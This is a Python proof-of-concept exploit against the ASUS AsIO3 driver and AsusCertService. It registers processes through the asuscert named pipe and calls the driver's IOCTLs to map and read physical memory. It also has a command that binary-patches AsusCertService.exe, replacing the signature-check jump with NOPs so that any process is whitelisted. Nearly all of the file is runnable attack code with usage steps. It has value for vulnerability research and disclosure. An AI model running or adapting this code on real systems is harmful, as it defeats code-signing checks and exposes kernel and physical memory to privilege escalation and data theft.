"""
AsIO3 Named Pipe Client — Proof of Concept
============================================
Demonstrates the \\.\pipe\asuscert protocol for PID registration.

FINDINGS:
- The pipe ONLY registers PIDs in the driver's whitelist
- The device \\.\Asusgio3 has a SYSTEM-only DACL
- Physical memory access requires SYSTEM privileges (PsExec -s)
- The pipe returns "OK!" regardless of success/failure

USAGE:
  python pipe_client.py probe           # Test pipe connectivity
  python pipe_client.py register        # Register our PID via pipe
  python pipe_client.py system_read     # Must run AS SYSTEM (PsExec -s)
  python pipe_client.py full            # Full flow: register + device access
"""

import ctypes
import struct
import os
import sys
from ctypes import wintypes

kernel32 = ctypes.windll.kernel32
kernel32.CreateFileW.restype = wintypes.HANDLE
kernel32.GetCurrentProcess.restype = wintypes.HANDLE

# Constants
GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 3
PIPE_READMODE_MESSAGE = 2
INVALID_HANDLE = wintypes.HANDLE(-1).value

# Known AsIO3 IOCTLs
IOCTL_REGISTER_PID = 0xA040A490
IOCTL_MAP_PHYS = 0xA040200C
IOCTL_UNMAP_PHYS = 0xA0402010
IOCTL_READ_PORT = 0xA0402000
IOCTL_WRITE_PORT = 0xA0402004
IOCTL_READ_MSR = 0xA040A440
IOCTL_WRITE_MSR = 0xA040A448
IOCTL_READ_PCI = 0xA040640C


def pipe_register_pid(pid=None):
    """
    Connect to \\.\pipe\asuscert and send PID for registration.

    Protocol:
      1. Open pipe (MESSAGE mode)
      2. Write 4-byte DWORD (PID)
      3. Read response (always "OK!" as UTF-16LE)

    Returns: (success: bool, response: str)
    """
    if pid is None:
        pid = os.getpid()

    pipe_name = r'\\.\pipe\asuscert'

    hPipe = kernel32.CreateFileW(
        pipe_name,
        GENERIC_READ | GENERIC_WRITE,
        0, None, OPEN_EXISTING, 0, None
    )

    if hPipe == INVALID_HANDLE:
        err = kernel32.GetLastError()
        return False, f"Failed to open pipe (error {err})"

    # Set message mode
    mode = wintypes.DWORD(PIPE_READMODE_MESSAGE)
    kernel32.SetNamedPipeHandleState(hPipe, ctypes.byref(mode), None, None)

    # Send PID
    msg = struct.pack('<I', pid)
    bytes_written = wintypes.DWORD(0)
    ok = kernel32.WriteFile(hPipe, msg, 4, ctypes.byref(bytes_written), None)
    if not ok:
        err = kernel32.GetLastError()
        kernel32.CloseHandle(hPipe)
        return False, f"WriteFile failed (error {err})"

    # Read response
    buf = ctypes.create_string_buffer(256)
    bytes_read = wintypes.DWORD(0)
    ok = kernel32.ReadFile(hPipe, buf, 256, ctypes.byref(bytes_read), None)

    kernel32.CloseHandle(hPipe)

    if ok and bytes_read.value > 0:
        response = buf.raw[:bytes_read.value].decode('utf-16le', errors='ignore').rstrip('\x00')
        return True, response
    else:
        err = kernel32.GetLastError()
        return False, f"ReadFile failed (error {err})"


def open_device():
    """
    Open \\.\Asusgio3 device.
    Requires SYSTEM privileges (DACL restricts to SYSTEM only).
    """
    hDev = kernel32.CreateFileW(
        r'\\.\Asusgio3',
        GENERIC_READ | GENERIC_WRITE,
        0, None, OPEN_EXISTING, 0, None
    )
    if hDev == INVALID_HANDLE:
        return None, kernel32.GetLastError()
    return hDev, 0


def register_self_in_driver(hDevice):
    """
    Call IOCTL 0xA040A490 directly on the device to register our PID.
    Only works if we already have a device handle (i.e., running as SYSTEM).
    """
    pid = os.getpid()
    in_buf = struct.pack('<I', pid)
    out_buf = ctypes.create_string_buffer(64)
    bytes_ret = wintypes.DWORD(0)

    ok = kernel32.DeviceIoControl(
        hDevice, IOCTL_REGISTER_PID,
        in_buf, 4,
        out_buf, 64,
        ctypes.byref(bytes_ret), None
    )
    return bool(ok)


def map_physical_memory(hDevice, phys_addr, size):
    """
    Map physical memory via IOCTL 0xA040200C.

    Input format: QWORD PhysicalAddress + DWORD Size (12 bytes)
    Output: mapped virtual address (QWORD, 8 bytes)

    NOTE: The driver has g_goodRanges checking - only certain
    address ranges may be accessible.
    """
    in_buf = struct.pack('<QI', phys_addr, size)
    out_buf = ctypes.create_string_buffer(4096)
    bytes_ret = wintypes.DWORD(0)

    ok = kernel32.DeviceIoControl(
        hDevice, IOCTL_MAP_PHYS,
        in_buf, len(in_buf),
        out_buf, 4096,
        ctypes.byref(bytes_ret), None
    )

    if ok and bytes_ret.value >= 8:
        mapped_va = struct.unpack_from('<Q', out_buf.raw, 0)[0]
        return mapped_va, bytes_ret.value
    else:
        return None, kernel32.GetLastError()


def unmap_physical_memory(hDevice, mapped_va, size):
    """Unmap previously mapped physical memory via IOCTL 0xA0402010."""
    in_buf = struct.pack('<QI', mapped_va, size)
    out_buf = ctypes.create_string_buffer(64)
    bytes_ret = wintypes.DWORD(0)

    ok = kernel32.DeviceIoControl(
        hDevice, IOCTL_UNMAP_PHYS,
        in_buf, len(in_buf),
        out_buf, 64,
        ctypes.byref(bytes_ret), None
    )
    return bool(ok)


def read_physical_memory(hDevice, phys_addr, size):
    """
    Read physical memory by mapping, copying, then unmapping.
    Returns bytes or None on failure.
    """
    mapped_va, result = map_physical_memory(hDevice, phys_addr, size)
    if mapped_va is None:
        print(f"  [!] Map failed: error {result}")
        return None

    print(f"  [+] Mapped 0x{phys_addr:X} -> VA 0x{mapped_va:X}")

    # Read from the mapped virtual address
    buf = (ctypes.c_char * size)()
    ctypes.memmove(buf, mapped_va, size)
    data = bytes(buf)

    # Unmap
    unmap_physical_memory(hDevice, mapped_va, size)

    return data


# ============================================================
# Command implementations
# ============================================================

def cmd_probe():
    """Test pipe connectivity."""
    print("[*] Probing \\\\.\\ pipe\\asuscert...")
    print(f"[*] Our PID: {os.getpid()}")

    ok, resp = pipe_register_pid()
    if ok:
        print(f"[+] Pipe response: [{resp}]")
        print("[!] NOTE: 'OK!' does NOT confirm PID was registered.")
        print("    The service always returns 'OK!' regardless of")
        print("    whether the signature check passed.")
    else:
        print(f"[-] Pipe failed: {resp}")


def cmd_register():
    """Register our PID and attempt device access."""
    pid = os.getpid()
    print(f"[*] Registering PID {pid} via pipe...")

    ok, resp = pipe_register_pid(pid)
    print(f"[*] Pipe response: [{resp}]")

    print(f"[*] Attempting to open \\\\.\\ Asusgio3...")
    hDev, err = open_device()
    if hDev:
        print(f"[+] Device opened! Handle: 0x{hDev:X}")
        kernel32.CloseHandle(hDev)
    else:
        print(f"[-] Device access denied (error {err})")
        print("[!] The device DACL only allows SYSTEM access.")
        print("[!] Use 'python pipe_client.py system_read' from PsExec -s")


def cmd_system_read():
    """
    Full physical memory read — must be run AS SYSTEM.
    Example: PsExec -s -i python pipe_client.py system_read
    """
    print("[*] Attempting SYSTEM-level device access...")

    # Step 1: Open device (only works as SYSTEM)
    hDev, err = open_device()
    if not hDev:
        print(f"[-] Cannot open device (error {err})")
        if err == 5:
            print("[!] ERROR_ACCESS_DENIED — you are NOT running as SYSTEM")
            print("[!] Run with: PsExec -s -i python pipe_client.py system_read")
        return

    print(f"[+] Device opened as SYSTEM! Handle: 0x{hDev:X}")

    # Step 2: Register our PID directly in driver
    if register_self_in_driver(hDev):
        print(f"[+] PID {os.getpid()} registered in driver whitelist")
    else:
        print(f"[!] PID registration IOCTL failed (error {kernel32.GetLastError()})")
        print("[*] Continuing anyway — access check may not apply to SYSTEM...")

    # Step 3: Read physical memory
    print("\n[*] Reading physical memory at 0x1000 (64 bytes)...")
    data = read_physical_memory(hDev, 0x1000, 64)
    if data:
        print(f"[+] SUCCESS! Read {len(data)} bytes:")
        # Hexdump
        for offset in range(0, len(data), 16):
            chunk = data[offset:offset+16]
            hex_str = ' '.join(f'{b:02X}' for b in chunk)
            ascii_str = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
            print(f"  {0x1000+offset:08X}: {hex_str:<48s} {ascii_str}")
    else:
        print("[-] Physical memory read failed")
        err = kernel32.GetLastError()
        if err == 998:
            print("[!] ERROR_NOACCESS — g_goodRanges may block this address")
        print(f"[!] Try a different address (ACPI tables at 0xE0000-0xFFFFF)")

    kernel32.CloseHandle(hDev)


def cmd_full():
    """Full pipeline demonstration."""
    print("=" * 60)
    print("AsIO3 Pipe Protocol — Full Flow Demonstration")
    print("=" * 60)
    print()

    # Phase 1: Pipe
    cmd_probe()
    print()

    # Phase 2: Device
    print("[*] Phase 2: Device access test...")
    hDev, err = open_device()
    if hDev:
        print(f"[+] Device accessible!")
        register_self_in_driver(hDev)
        data = read_physical_memory(hDev, 0x1000, 16)
        if data:
            print(f"[+] Physical memory read: {data.hex()}")
        kernel32.CloseHandle(hDev)
    else:
        print(f"[-] Device denied (error {err})")
        print()
        print("SUMMARY:")
        print("  The pipe protocol is functional but insufficient alone.")
        print("  The driver checks PID whitelist at CreateFile time.")
        print("  Only ASUS-signed processes get their PID registered.")
        print()
        print("TO GET FULL ACCESS:")
        print("  1. python pipe_client.py patch   (patch service binary)")
        print("  2. Restart the service")
        print("  3. python pipe_client.py register")


def cmd_patch():
    """
    Patch AsusCertService.exe to skip the WinVerifyTrust check.
    Must be run as admin. Stops the service, patches, restarts.
    """
    import shutil, time

    SERVICE_EXE = r'C:\Program Files (x86)\ASUS\AsusCertService\1.3.2\AsusCertService.exe'
    PATCH_OFFSET = 0x129B6
    ORIGINAL_BYTES = bytes.fromhex('0f84bd040000')
    PATCHED_BYTES = bytes.fromhex('909090909090')

    print("[*] AsusCertService.exe Binary Patcher")
    print(f"[*] Target: {SERVICE_EXE}")
    print(f"[*] Patch offset: 0x{PATCH_OFFSET:X}")
    print(f"[*] Original: {ORIGINAL_BYTES.hex()} (JE - jump to failure if cert invalid)")
    print(f"[*] Patched:  {PATCHED_BYTES.hex()} (NOP x6 - always continue to success)")
    print()

    if not os.path.exists(SERVICE_EXE):
        print(f"[-] File not found: {SERVICE_EXE}")
        return

    with open(SERVICE_EXE, 'rb') as f:
        f.seek(PATCH_OFFSET)
        current = f.read(6)

    if current == PATCHED_BYTES:
        print("[+] Already patched!")
        return

    if current != ORIGINAL_BYTES:
        print(f"[-] Unexpected bytes at offset: {current.hex()}")
        print(f"[-] Expected: {ORIGINAL_BYTES.hex()}")
        print("[-] Binary may be different version. Aborting.")
        return

    print("[+] Verified: original bytes match")
    print()
    print("[*] Stopping AsusCertService...")
    os.system('net stop AsusCertService >nul 2>&1')
    time.sleep(2)

    backup = SERVICE_EXE + '.bak'
    if not os.path.exists(backup):
        print(f"[*] Creating backup: {backup}")
        shutil.copy2(SERVICE_EXE, backup)

    print("[*] Applying patch...")
    try:
        with open(SERVICE_EXE, 'r+b') as f:
            f.seek(PATCH_OFFSET)
            f.write(PATCHED_BYTES)
        print("[+] Patch applied!")
    except PermissionError:
        print("[-] Permission denied. Run as administrator!")
        os.system('net start AsusCertService >nul 2>&1')
        return

    print("[*] Starting patched service...")
    os.system('net start AsusCertService >nul 2>&1')
    time.sleep(2)
    print()
    print("[+] DONE! Service now accepts any process for PID registration.")
    print("[+] Next: python pipe_client.py register")
    print("[*] To restore: copy .bak file back and restart service")


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(__doc__)
        print("Commands: probe, register, system_read, full, patch")
        sys.exit(0)

    cmd = sys.argv[1].lower()
    if cmd == 'probe':
        cmd_probe()
    elif cmd == 'register':
        cmd_register()
    elif cmd == 'system_read':
        cmd_system_read()
    elif cmd == 'full':
        cmd_full()
    elif cmd == 'patch':
        cmd_patch()
    else:
        print(f"Unknown command: {cmd}")
        print("Commands: probe, register, system_read, full, patch")
